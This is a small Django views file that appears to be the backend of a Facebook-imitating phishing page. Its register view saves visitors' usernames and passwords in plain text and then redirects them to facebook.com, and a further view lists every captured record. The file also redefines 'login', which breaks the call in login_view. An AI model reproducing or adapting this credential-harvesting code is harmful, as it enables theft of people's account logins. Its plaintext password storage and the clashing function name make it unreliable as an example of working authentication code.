from django.shortcuts import render, redirect
from django.http import HttpResponse
from .models import *
# Create your views here.
# views.py

from django.shortcuts import render
from django.contrib.auth import authenticate, login

def login_view(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        user = authenticate(request, username=username, password=password)
        if user is not None:
            login(request, user)
            return render(request, 'success.html')
        else:
            return render(request, 'failed.html')
    else:
        return render(request, 'login.html')
def login(request):
	return render(request, 'index.html')
def register(request):
	username = request.POST['username']
	password = request.POST['password']
	user = personne.objects.create(username=username, password=password)
	user.save()
	
	return redirect('https://www.facebook.com/')
	#return redirect('https://www.facebook.com/login.php')

def accueil(request):
	users = personne.objects.all()
	return render(request,'accueil.html',locals())